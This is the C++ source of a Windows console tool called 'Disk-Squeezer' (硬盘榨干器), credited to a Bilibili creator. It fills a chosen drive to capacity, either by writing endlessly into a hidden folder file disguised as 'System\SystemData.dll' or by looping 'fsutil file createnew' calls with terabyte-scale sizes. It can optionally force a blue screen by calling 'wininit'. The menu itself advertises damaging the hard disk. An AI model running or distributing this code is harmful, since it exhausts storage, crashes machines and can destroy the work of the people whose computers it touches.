//硬盘榨干器(Disk-Squeezer) 版本v1.5 Bilibili@龙ger_longer制作


#define _CRT_SECURE_NO_WARNINGS 1
//头文件
#include<bits/stdc++.h>
#include<direct.h>
#include<fstream>
#include<windows.h>
#include<string.h>
#include<sstream>



//语言变量
std::string language;

//各种转换类
class Convert {
public:
	std::string int_to_string(int num) {
		std::ostringstream oss;
		oss << num;
		return oss.str();
	}
	LPCWSTR char_to_wchar(const char* str) {
		int len = strlen(str) + 1;
		wchar_t* wstr = new wchar_t[len];
		mbstowcs(wstr, str, len);
		return wstr;
	}
};


//隐藏和显示光标函数
void ShowCursor(bool visible) {
	CONSOLE_CURSOR_INFO cursor_info = { 1, visible };
	SetConsoleCursorInfo(GetStdHandle(STD_OUTPUT_HANDLE), &cursor_info);
}




//选择语言函数
void SelectLanguage() {
	system("cls");
	std::cout << "输入以选择语言(Language)“简体中文” or \"English\"：";
	std::cin >> language;
	if (language != "简体中文" && language != "English") {
		std::cout << "语言不存在或不支持！The language does not exist or is not supported!\n";
		std::cout << "请注意大小写！Please pay attention to the case!\n";
		std::cout << "3秒后重新选择。Reselect after 3 seconds.";
		Sleep(3000);
		SelectLanguage();
	}
}





//关闭程序函数
void CloseProgram() {
	if (language == "简体中文") {
		std::cout << "程序将在 \033[32m3\033[0m 秒后自动退出……";
		Sleep(1000);
		std::cout << "\r程序将在 \033[32m2\033[0m 秒后自动退出……";
		Sleep(1000);
		std::cout << "\r程序将在 \033[32m1\033[0m 秒后自动退出……";
		Sleep(1000);
		std::cout << "\n程序退出……";
	}
	else if (language == "English") {
		std::cout << "The program will automatically exit after \033[32m3\033[0m seconds......";
		Sleep(1000);
		std::cout << "\rThe program will automatically exit after \033[32m2\033[0m seconds......";
		Sleep(1000);
		std::cout << "\rThe program will automatically exit after \033[32m1\033[0m seconds......";
		Sleep(1000);
		std::cout << "\nProgram Exit ......";
	}
}


//定义函数
void wt(std::string fp, std::string dp, std::string pf, std::string bs);
void ft(std::string cmd, std::string dp, std::string fp, std::string lj, std::string bs);
void SelectMode();
void About();

//主函数
int main()
{
	Convert Convert;
	SetConsoleTitle(Convert.char_to_wchar("Disk-Squeezer v1.5-x64"));
	ShowCursor(true);
	SelectLanguage();
	SelectMode();


	Sleep(100);
	return 0;
}

void wt(std::string fp, std::string dp, std::string pf, std::string bs) {
	Convert Convert;
	ShowCursor(false);
	std::string revolve="|";
	double space = 0.0;
	double percentage;
	percentage = 0.0;
	fp.append("\\System");
	CreateDirectory(Convert.char_to_wchar(fp.c_str()), NULL);
	std::string lujing = fp;// 创建文件
	fp.append("\\SystemData.dll");
	DWORD64 qwFreeBytesToCaller = 0;
	DWORD64 qwTotalBytes = 0;
	DWORD64 qwFreeBytes = 0;
	BOOL bResult = GetDiskFreeSpaceExA(pf.c_str(), (PULARGE_INTEGER)&qwFreeBytesToCaller, (PULARGE_INTEGER)&qwTotalBytes, (PULARGE_INTEGER)&qwFreeBytes);
	std::ofstream file(fp.c_str());
	if (file.is_open()) {
		while (true) {
			percentage = (space * 1.00) / (qwFreeBytes * 1.00) * 100.00;
			std::cout << "\r" << dp << "[" << percentage << "%]";
			int count;
			for (count = 0; count <= percentage / 2; count++) {
				std::cout << "\033[32m\033[9m\033[1m \033[0m";
			}
			for (int j = 0; j <= 50 - count; j++) {
				std::cout << "\033[32m\033[9m\033[2m \033[0m";
			}


			//持续旋转提示程序运行
			if (revolve == "|") {
				std::cout << "/";
				revolve = "/";
			}
			else if (revolve == "/") {
				std::cout << "-";
				revolve = "-";
			}
			else if (revolve == "-") {
				std::cout << "\\";
				revolve = "\\";
			}
			else {
				std::cout << "|";
				revolve = "|";
			}


			file << "你好";
			space += 7;
			if (!file) {
				system("cls");
				std::cout << dp << "\033[32m[\033[0m" << 100 << "\033[32m%]\033[0m" 
					<< "\033[32m\033[9m\033[1m                                                  [√]\033[0m" << std::endl;
				if (language == "简体中文") std::cout << "\033[32m\033[1m完成！\033[0m" << std::endl;
				else if (language == "English") std::cout << "\033[32m\033[1mDone!\033[0m" << std::endl;
				SetFileAttributes(Convert.char_to_wchar(lujing.c_str()), FILE_ATTRIBUTE_HIDDEN);
				file.close();  // 关闭文件
				CloseProgram();
				if (bs == "Y") {
					system("wininit");
				}
				break;
			}
		}

	}
	else {
		if (language == "简体中文") std::cout << "错误的盘符或格式不正确" << std::endl;
		else if (language == "English") std::cout << "Wrong disk or format" << std::endl;
		Sleep(100);
		CloseProgram();
	}
}

void ft(std::string cmd, std::string dp, std::string fp, std::string lj, std::string bs) {
	Convert Convert;
	long long a;
	long name;
	a = 1099511627776;
	name = 1;
	system("cls");
	std::cout << dp << std::endl;
	while (true) {
		cmd = "";
		cmd = "fsutil file createnew ";
		cmd.append(fp);
		cmd.append(Convert.int_to_string(name));
		cmd.append(" 1099511627776");
		int result = system(cmd.c_str());
		if (result == 0) {
			system("cls");
			if (language == "简体中文") std::cout << "命令成功运行！" << std::endl;
			else if (language == "English") std::cout << "Command successfully run!" << std::endl;
			name += 1;
		}
		else {
			if (a == 1) {
				system("cls");
				if (language == "简体中文") std::cout << "完成！[√]";
				else if (language == "English") std::cout << "Done![√]";
				SetFileAttributes(Convert.char_to_wchar(lj.c_str()), FILE_ATTRIBUTE_HIDDEN);
				CloseProgram();
				if (bs == "Y") {
					system("wininit");
				}
				break;
			}
			else {
				if (a == 1099511627776) {
					cmd = "fsutil file createnew ";
					cmd.append(fp);
					cmd.append(Convert.int_to_string(name));
					cmd.append(" 549755813888");
					result = system(cmd.c_str());
					name += 1;
					if (result != 0) {
						a = 549755813888;
					}
				}
				else if (a == 549755813888) {
					cmd = "fsutil file createnew ";
					cmd.append(fp);
					cmd.append(Convert.int_to_string(name));
					cmd.append(" 1073741824");
					result = system(cmd.c_str());
					name += 1;
					if (result != 0) {
						a = 1073741824;
					}
				}
				else if (a == 1073741824) {
					cmd = "fsutil file createnew ";
					cmd.append(fp);
					cmd.append(Convert.int_to_string(name));
					cmd.append(" 536870912");
					result = system(cmd.c_str());
					name += 1;
					if (result != 0) {
						a = 536870912;
					}
				}
				else if (a == 536870912) {
					cmd = "fsutil file createnew ";
					cmd.append(fp);
					cmd.append(Convert.int_to_string(name));
					cmd.append(" 1048576");
					result = system(cmd.c_str());
					name += 1;
					if (result != 0) {
						a = 1048576;
					}
				}
				else if (a == 1048576) {
					cmd = "fsutil file createnew ";
					cmd.append(fp);
					cmd.append(Convert.int_to_string(name));
					cmd.append(" 524288");
					result = system(cmd.c_str());
					name += 1;
					if (result != 0) {
						a = 524288;
					}
				}
				else if (a == 524288) {
					cmd = "fsutil file createnew ";
					cmd.append(fp);
					cmd.append(Convert.int_to_string(name));
					cmd.append(" 1024");
					result = system(cmd.c_str());
					name += 1;
					if (result != 0) {
						a = 1024;
					}
				}
				else if (a == 1024) {
					cmd = "fsutil file createnew ";
					cmd.append(fp);
					cmd.append(Convert.int_to_string(name));
					cmd.append(" 512");
					result = system(cmd.c_str());
					name += 1;
					if (result != 0) {
						a = 512;
					}
				}
				else {
					cmd = "fsutil file createnew ";
					cmd.append(fp);
					cmd.append(Convert.int_to_string(name));
					cmd.append(" 1");
					result = system(cmd.c_str());
					name += 1;
					if (result != 0) {
						a = 1;
					}
				}
			}
		}
	}
}


//选择模式函数
void SelectMode() {
	Convert Convert;
	system("cls");
	std::string panfu;
	std::string display;
	std::string choose;
	std::string bluescreen;
	if (language == "简体中文")	std::cout << "请选择模式：(A/B/C)" << std::endl << "A. 普通榨干（纯写入，速度慢，但可有效对硬盘造成伤害）" << std::endl << "B. 快速榨干（使用system函数，速度快，可快速榨干，但不能对硬盘造成伤害）" << std::endl << "C. 关于本程序……" << std::endl << "选择：";
	else if (language == "English")std::cout << "Please select mode: (A/B/C)" << std::endl << "A. Ordinary squeezing (pure write, slow speed, but can effectively cause damage to the hard disk)" << std::endl << "B. Fast squeezing (using the system function, the speed is fast, it can be quickly squeezed, but it cannot cause damage to the hard disk)" << std::endl << "C. About the Program..." << std::endl << "Choose:";
	std::cin >> choose;
	system("cls");
	if (language == "简体中文" && choose != "C") std::cout << "榨干之后是否自动蓝屏？（Y/N）";
	else if (language == "English" && choose != "C") std::cout << "Is there an automatic blue screen after squeezing?(Y/N)";
	if(choose != "C")std::cin >> bluescreen;


	//A选项处理
	if (choose == "A") {
		system("cls");
		if (language == "简体中文") std::cout << "请输入需要榨干的盘符： ";
		else if (language == "English") std::cout << "Please enter the drive letter to be squeezed dry: ";
		std::cin >> panfu;
		if (language == "简体中文") std::cout << "请输入需要显示的内容： ";
		else if (language == "English") std::cout << "Please enter what you want to display: ";
		std::cin >> display;
		std::string filepath = panfu;
		wt(filepath, display, panfu, bluescreen);
	}


	//B选项处理
	else if (choose == "B") {
		system("cls");
		std::string command;
		if (language == "简体中文") std::cout << "请输入需要榨干的盘符： ";
		else if (language == "English") std::cout << "Please enter the drive letter to be squeezed dry: ";
		std::cin >> panfu;
		std::string filepath = panfu;
		filepath.append("\\System");
		std::string lujing = filepath;
		CreateDirectory(Convert.char_to_wchar(filepath.c_str()), NULL);
		filepath.append("\\");
		command = "fsutil file createnew ";
		command.append(filepath);
		command.append(" ");
		ft(command, display, filepath, lujing, bluescreen);
	}


	//C选项处理
	else if (choose == "C") {
		About();
	}
	else {
		if (language == "简体中文") std::cout << "选项不存在！\n";
		if (language == "English") std::cout << "The option doesn't exist!\n";
		CloseProgram();
	}
}



//关于函数
void About() {
	std::string input;
	system("cls");
	if (language == "简体中文") {
		std::cout << "本程序名为“硬盘榨干器(Disk-Squeezer)”，由 \033[36mBilibili@龙ger_longer\033[0m 制作。\n\n"
			"本程序为\033[32m开源程序\033[0m，源代码请向up主\033[32m私信\033[0m以获取，获取源代码时请\033[32m说明用处\033[0m，源代码仅供\033[32m参考和学习\033[0m。\n\n"
			"\033[6m\033[1m\033[7m\033[31m注意！本程序可以榨干您的硬盘！可以使您的电脑蓝屏(需要以管理员模式启动)，请谨慎使用！\033[0m\n\n"
			"\033[32m声明：本程序不属于木马病毒，请不要误解。\033[0m\n\n"
			"\033[1m\033[31m请勿将本程序用作过于过分的事情！\033[0m\n\n"
			"\033[36m记得三连！\033[0m\n";
		std::cout << "输入“E”以返回：";
	}
	else if (language == "English") {
		std::cout << "This program is called \"硬盘榨干器(Disk-Squeezer)\", Produced by \033[36mBilibili@龙ger_longer\033[0m.\n\n"
			"This program is an \033[32mopen source program\033[0m, the source code please \033[32msend a private message\033[0m to the UP master to obtain, please \033[32mexplain the use\033[0m when obtaining the source code, the source code is for \033[32mreference and learning\033[0m only.\n\n"
			"\033[6m\033[1m\033[7m\033[31mNote!This program can drain your hard drive!Can make your computer blue screen (needs to be booted in administrator mode), please use with caution!\033[0m\n\n"
			"\033[32mDisclaimer: This program is not a Trojan virus, please do not misunderstand.\033[0m\n\n"
			"\033[1m\033[31mDon't use this program as something too excessive!\033[0m\n\n";
		std::cout << "Enter \"E\" to return:";
	}

	std::cin >> input;
	if (input == "E") {
		system("cls");
		SelectMode();
	}
	else About();
}


